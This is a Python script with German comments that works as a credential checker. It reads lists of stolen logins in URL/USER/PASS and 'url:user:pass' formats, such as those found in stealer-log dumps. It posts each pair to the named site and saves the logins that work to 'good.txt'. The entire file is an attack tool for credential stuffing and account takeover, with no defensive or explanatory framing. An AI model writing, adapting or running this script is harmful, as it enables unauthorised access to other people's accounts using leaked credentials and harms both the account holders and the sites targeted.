import requests
import time
from urllib.parse import urlparse

input_file = "logins.txt"
good_file = "good.txt"
output_file = "output.txt"
successful_identifier = "successful_login_identifier"

def ensure_url_scheme(url):
    if not url.startswith(('http://', 'https://')):
        return 'http://' + url  # Standardmäßig http hinzufügen
    return url

def is_valid_url(url):
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)

def is_relevant_line(line):
    return any(keyword in line for keyword in ["URL:", "USER:", "Username:", "PASS:", "Password:"])

def is_url_line(line):
    return line.startswith("URL:")

def is_user_line(line):
    return line.startswith("USER:") or line.startswith("Username:")

def is_pass_line(line):
    return line.startswith("PASS:") or line.startswith("Password:")

def log_output(message, file_handle):
    trimmed_message = (message[:497] + '...') if len(message) > 500 else message
    print(trimmed_message)  # Ausgabe auf der Konsole
    file_handle.write(trimmed_message + '\n')  # Ausgabe in die Datei

def process_login(url, username, password, output_handle, good_handle):
    url = ensure_url_scheme(url)  # Sicherstellen, dass die URL ein Schema hat
    if not is_valid_url(url):
        log_output(f"Ungültige URL: {url}", output_handle)
        return

    data = {
        "username": username,
        "password": password
    }

    try:
        # Senden der POST-Anfrage mit einer Timeout-Einstellung
        response = requests.post(url, data=data, timeout=10)
        response_text = response.text[:500]

        if successful_identifier in response_text:
            log_output(f"Login erfolgreich für {url}", output_handle)
            good_handle.write(f"URL: {url}\nUSER: {username}\nPASS: {password}\n")
        else:
            log_output(f"Login fehlgeschlagen für {url}", output_handle)
    except requests.exceptions.RequestException as e:
        log_output(f"Fehler beim Verarbeiten der URL: {url}\nGrund: {e}", output_handle)

# Startdatum und Zeit
start_time = time.time()

with open(good_file, "w") as good, open(output_file, "w") as output:
    with open(input_file, "r", encoding="ISO-8859-1") as file:
        lines_buffer = []

        for line_num, line in enumerate(file, start=1):
            line = line.strip()
            if not line or not is_relevant_line(line):
                continue

            if is_url_line(line):
                lines_buffer = [line]  # Starten eines neuen 3er-Blocks
            elif lines_buffer and is_user_line(line):
                lines_buffer.append(line)
            elif lines_buffer and len(lines_buffer) == 2 and is_pass_line(line):
                lines_buffer.append(line)

            if len(lines_buffer) == 3:
                url = lines_buffer[0].split("URL:")[1].strip()
                username = lines_buffer[1].split("USER:")[1].strip() if "USER:" in lines_buffer[1] else lines_buffer[1].split("Username:")[1].strip()
                password = lines_buffer[2].split("PASS:")[1].strip() if "PASS:" in lines_buffer[2] else lines_buffer[2].split("Password:")[1].strip()
                process_login(url, username, password, output, good)
                lines_buffer.clear()

        file.seek(0)
        for line_num, line in enumerate(file, start=1):
            line = line.strip()
            if not line:
                continue

            parts = line.split(' ')
            if len(parts) >= 2 and ":" in parts[1]:
                url_user_pass = parts[1].split(':')
                if len(url_user_pass) == 3:
                    url = url_user_pass[0]
                    username = url_user_pass[1]
                    password = url_user_pass[2]
                    process_login(url, username, password, output, good)

end_time = time.time()
execution_time = end_time - start_time
print(f"Die Laufzeit des Skripts beträgt {execution_time} Sekunden")

# Optional: Warte kurz, um die Arbeitslast zu reduzieren
time.sleep(0.1)